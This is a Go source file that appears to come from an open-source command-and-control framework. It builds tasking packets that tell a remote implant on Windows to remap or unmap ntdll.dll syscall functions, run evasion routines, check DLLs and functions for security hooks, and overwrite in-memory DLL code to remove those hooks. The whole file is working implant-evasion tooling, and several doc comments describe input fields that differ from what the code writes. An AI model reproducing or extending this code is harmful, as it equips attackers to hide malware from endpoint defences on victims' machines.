//go:build !implant
// +build !implant

// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/device/winapi"
)

// FuncUnmapAll returns a syscall function unmap Packet. This can be used to instruct
// the client to unmap all of the re-mapped ntdll.dll functions to their original
// addresses.
//
// This function only returns an error if it occurred during unmapping.
//
// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
// "funcmap" capability or they will return nil.
//
// C2 Details:
//
//	ID: TvFuncMap
//
//	Input:
//	    uint8 // Always 2 for this
//	Output:
//	    <none>
func FuncUnmapAll() *com.Packet {
	n := &com.Packet{ID: TvFuncMap}
	n.WriteUint8(taskFuncMapUnmapAll)
	return n
}

// Evade returns a client Evasion Packet. This can be used to instruct the client
// perform evasion functions dependent on the supplied bitmask value.
//
// Some evasion methods include zero-ing out function calls and disabling Debugger
// view of functions.
//
// This will return an error if it fails.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvEvade
//
//	Input:
//	    uint8 // Evasion Flags
//	Output:
//	    <none>
func Evade(f uint8) *com.Packet {
	n := &com.Packet{ID: TvEvade}
	n.WriteUint8(f)
	return n
}

// FuncRemapList returns a syscall function mapping list Packet. This can be used to
// instruct the client to return details of all of the re-mapped ntdll.dll functions.
//
// The result will be an array of FuncEntries that will indicate the new and original
// memory addresses of the function the represent.
//
// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
// "funcmap" capability or they will return nil.
//
// C2 Details:
//
//	ID: TvFuncMapList
//
//	Input:
//	    <none>
//	Output:
//	    uint32        // Count
//	    []FuncEntry { // List of open Windows
//	        uint32    // Function hash
//	        uint64    // Function original address
//	        uint64    // Function swapped address
//	    }
func FuncRemapList() *com.Packet {
	return &com.Packet{ID: TvFuncMapList}
}

// FuncUnmap returns a syscall function unmap Packet. This can be used to instruct
// the client to unmap the re-mapped ntdll.dll function name to it's original address.
//
// This function only returns an error if it occurred during unmapping.
//
// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
// "funcmap" capability or they will return nil.
//
// C2 Details:
//
//	ID: TvFuncMap
//
//	Input:
//	    uint8  // Always 1 for this
//	    uint32 // FNV Hash of the function name
//	Output:
//	    <none>
func FuncUnmap(name string) *com.Packet {
	n := &com.Packet{ID: TvFuncMap}
	n.WriteUint8(taskFuncMapUnmap)
	n.WriteUint32(winapi.FnvHash(name))
	return n
}

// CheckDLLFile returns a DLL integrity verification Packet. This can be used to
// instruct the client to check the in-memory contents of the DLL name or file
// path provided to ensure it matches "known-good" values.
//
// This function version will read in the DLL data from the client disk and will
// verify the entire executable region.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// The clients returns true if the DLL is considered valid/unhooked.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvCheck
//
//	Input:
//	    string // DLL Name/Path
//	    string // Empty for this function
//	    uint32 // Zero for this function
//	    []byte // Empty for this function
//	Output:
//	    bool   // True if DLL is clean, false if it is tampered with
func CheckDLLFile(dll string) *com.Packet {
	n := &com.Packet{ID: TvCheck}
	n.WriteString(dll)
	n.WriteUint32(0)
	n.WriteUint16(0)
	return n
}

// PatchDLLFile returns a DLL patching Packet. This can be used to instruct the
// client to overrite the in-memory contents of the DLL name or file path
// provided to ensure it has "known-good" values.
//
// This function version will read in the DLL data from the client disk and will
// overwite the entire executable region.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvPatch
//
//	Input:
//	    string // DLL Name/Path
//	    string // Empty for this function
//	    uint32 // Zero for this function
//	    []byte // Empty for this function
//	Output:
//	    <none>
func PatchDLLFile(dll string) *com.Packet {
	n := &com.Packet{ID: TvPatch}
	n.WriteString(dll)
	n.WriteUint32(0)
	n.WriteUint16(0)
	return n
}

// FuncRemap returns a syscall function mapping Packet. This can be used to instruct
// the client to upload the bytes to be re-mapped to a new memory address that
// can be used to override the supplied ntdll.dll function name.
//
// This function only returns an error if it occurred during mapping.
//
// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
// "funcmap" capability or they will return EINVAL.
//
// C2 Details:
//
//	ID: TvFuncMap
//
//	Input:
//	    uint8  // Always 0 for this
//	    uint32 // FNV Hash of the function name
//	    []byte // Function bytes to write into memory
//	Output:
//	    <none>
func FuncRemap(name string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvFuncMap}
	n.WriteUint8(taskFuncMapMap)
	n.WriteUint32(winapi.FnvHash(name))
	n.WriteBytes(b)
	return n
}

// CheckFunction returns a DLL function integrity verification Packet. This can
// be used to instruct the client to check the in-memory contents of the DLL name
// or file path provided with the supplied function name to ensure it matches
// "known-good" values.
//
// This function version will check the function base address against the supplied
// bytes. If the bytes supplied are nil/empty, this will do a simple long JMP/CALL
// Assembly check instead.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// The clients returns true if the DLL function is considered valid/unhooked.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvCheck
//
//	Input:
//	    string // DLL Name/Path
//	    string // Function name
//	    uint32 // Zero for this function
//	    []byte // Function bytes to check against
//	Output:
//	    bool   // True if DLL is clean, false if it is tampered with
func CheckFunction(dll, name string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvCheck}
	n.WriteString(dll)
	n.WriteString(name)
	n.WriteUint32(0)
	n.WriteBytes(b)
	return n
}

// PatchFunction returns a DLL patching Packet. This can be used to instruct the
// client to overrite the in-memory contents of the DLL name or file path
// provided with the supplied function name to ensure it has "known-good" values.
//
// This function version will overwite the function base address against the supplied
// bytes. If the bytes supplied are nil/empty, this will pull the bytes for the
// function from the local DLL source.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvPatch
//
//	Input:
//	    string // DLL Name/Path
//	    string // Function name
//	    uint32 // Zero for this function
//	    []byte // Function bytes to check against
//	Output:
//	    <none>
func PatchFunction(dll, name string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvPatch}
	n.WriteString(dll)
	n.WriteString(name)
	n.WriteUint32(0)
	n.WriteBytes(b)
	return n
}

// CheckDLL returns a DLL integrity verification Packet. This can be used to
// instruct the client to check the in-memory contents of the DLL name or file
// path provided to ensure it matches "known-good" values.
//
// This function version will check the DLL contents against the supplied bytes
// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
// If the byte array is nil/empty, this will instead act like the 'CheckDLLFile'
// function and read from disk.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// The clients returns true if the DLL is considered valid/unhooked.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvCheck
//
//	Input:
//	    string // DLL Name/Path
//	    string // Empty for this function
//	    uint32 // Zero for this function
//	    []byte // Empty for this function
//	Output:
//	    bool   // True if DLL is clean, false if it is tampered with
func CheckDLL(dll string, addr uint32, b []byte) *com.Packet {
	n := &com.Packet{ID: TvCheck}
	n.WriteString(dll)
	n.WriteUint8(0)
	n.WriteUint32(addr)
	n.WriteBytes(b)
	return n
}

// PatchDLL returns a DLL patching Packet. This can be used to instruct the
// client to overrite the in-memory contents of the DLL name or file path
// provided to ensure it has "known-good" values.
//
// This function version will overwrite the DLL contents against the supplied bytes
// and starting address. The 'winapi.ExtractDLLBase' can suppply these values.
// If the byte array is nil/empty, this will instead act like the 'PatchDLLFile'
// function and read from disk.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvPatch
//
//	Input:
//	    string // DLL Name/Path
//	    string // Empty for this function
//	    uint32 // Zero for this function
//	    []byte // Empty for this function
//	Output:
//	    <none>
func PatchDLL(dll string, addr uint32, b []byte) *com.Packet {
	n := &com.Packet{ID: TvPatch}
	n.WriteString(dll)
	n.WriteUint8(0)
	n.WriteUint32(addr)
	n.WriteBytes(b)
	return n
}

// CheckFunctionFile returns a DLL function integrity verification Packet. This can
// be used to instruct the client to check the in-memory contents of the DLL name
// or file path provided with the supplied function name to ensure it matches
// "known-good" values.
//
// This function version will check the function base address against the supplied
// bytes. If the bytes supplied are nil/empty, this will pull the bytes for the
// function from the local DLL source.
//
// DLL base names will be expanded on the client to full paths not if already full
// path names. (Unless it is a known DLL name).
//
// The clients returns true if the DLL function is considered valid/unhooked.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//
//	ID: TvCheck
//
//	Input:
//	    string // DLL Name/Path
//	    string // Function name
//	    uint32 // Zero for this function
//	    []byte // Function bytes to check against
//	Output:
//	    bool   // True if DLL is clean, false if it is tampered with
func CheckFunctionFile(dll, name string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvCheck}
	n.WriteString(dll)
	n.WriteString(name)
	n.WriteUint32(1)
	n.WriteBytes(b)
	return n
}
